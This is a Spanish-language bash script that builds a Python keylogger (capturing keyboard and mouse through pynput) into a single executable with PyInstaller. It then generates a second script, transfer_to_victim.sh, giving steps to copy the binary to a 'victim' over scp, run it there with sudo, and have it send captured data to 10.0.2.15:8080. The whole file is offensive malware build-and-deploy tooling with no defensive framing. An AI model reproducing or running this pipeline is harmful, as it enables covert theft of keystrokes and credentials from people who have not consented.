#!/bin/bash
# compile_keylogger.sh - compilador robusto de keylogger

set -e  # salir si hay error

echo "compilador robusto de keylogger"
echo "==============================="

# verificar archivos necesarios
if [ ! -f "unified_keylogger.py" ] || [ ! -f "reconstructor.py" ]; then
    echo "error: archivos fuente no encontrados"
    exit 1
fi

# funciones de instalacion
install_via_apt() {
    echo "instalando dependencias via apt..."
    sudo apt update
    sudo apt install -y python3-pip python3-dev python3-setuptools
    sudo apt install -y python3-pyinstaller || return 1
    return 0
}

install_via_pip_system() {
    echo "instalando pyinstaller via pip con --break-system-packages..."
    python3 -m pip install --break-system-packages pyinstaller || return 1
    return 0
}

install_via_venv() {
    echo "creando entorno virtual..."
    python3 -m venv build_env
    source build_env/bin/activate
    
    echo "instalando pyinstaller en entorno virtual..."
    pip install --upgrade pip
    pip install pyinstaller
    
    echo "compilando en entorno virtual..."
    pyinstaller --onefile --console --name=keylogger \
        --add-data="reconstructor.py:." \
        --hidden-import=pynput \
        --hidden-import=pynput.keyboard \
        --hidden-import=pynput.mouse \
        --hidden-import=requests \
        --hidden-import=urllib3 \
        --clean \
        unified_keylogger.py
    
    deactivate
    rm -rf build_env
    return 0
}

# metodo 1: intentar con apt
echo "metodo 1: instalacion via apt"
if install_via_apt; then
    echo "pyinstaller instalado via apt"
    PYINSTALLER_CMD="pyinstaller"
elif install_via_pip_system; then
    echo "pyinstaller instalado via pip"
    PYINSTALLER_CMD="python3 -m PyInstaller"
elif install_via_venv; then
    echo "compilacion completada via entorno virtual"
    if [ -f "dist/keylogger" ]; then
        echo ""
        echo "====================================="
        echo "ejecutable creado exitosamente"
        echo "====================================="
        echo "ubicacion: dist/keylogger"
        echo "tamaño: $(du -h dist/keylogger | cut -f1)"
        echo "uso: sudo ./dist/keylogger"
        echo "====================================="
        exit 0
    else
        echo "error: no se pudo crear el ejecutable"
        exit 1
    fi
else
    echo "error: no se pudo instalar pyinstaller"
    exit 1
fi

# limpiar compilaciones anteriores
echo "limpiando archivos temporales..."
rm -rf build dist *.spec

# compilar
echo "compilando keylogger..."
$PYINSTALLER_CMD --onefile --console --name=keylogger \
    --add-data="reconstructor.py:." \
    --hidden-import=pynput \
    --hidden-import=pynput.keyboard \
    --hidden-import=pynput.mouse \
    --hidden-import=requests \
    --hidden-import=urllib3 \
    --clean \
    unified_keylogger.py

# verificar resultado
if [ -f "dist/keylogger" ]; then
    echo ""
    echo "====================================="
    echo "ejecutable creado exitosamente"
    echo "====================================="
    echo "ubicacion: dist/keylogger"
    echo "tamaño: $(du -h dist/keylogger | cut -f1)"
    echo "uso: sudo ./dist/keylogger"
    echo "====================================="
    
    # crear script de transferencia
    cat > transfer_to_victim.sh << 'EOF'
#!/bin/bash
# transfer_to_victim.sh - transferir ejecutable a victima

if [ ! -f "dist/keylogger" ]; then
    echo "error: ejecutable no encontrado"
    echo "ejecuta primero: ./compile_keylogger.sh"
    exit 1
fi

echo "instrucciones para transferir a victima:"
echo "========================================"
echo "1. copiar ejecutable a victima:"
echo "   scp dist/keylogger usuario@victima:/tmp/"
echo ""
echo "2. en la victima ejecutar:"
echo "   sudo /tmp/keylogger"
echo ""
echo "3. el keylogger enviara datos a: 10.0.2.15:8080"
echo "========================================"
EOF
    
    chmod +x transfer_to_victim.sh
    echo "script de transferencia creado: transfer_to_victim.sh"
else
    echo "error: no se pudo crear el ejecutable"
    exit 1
fi
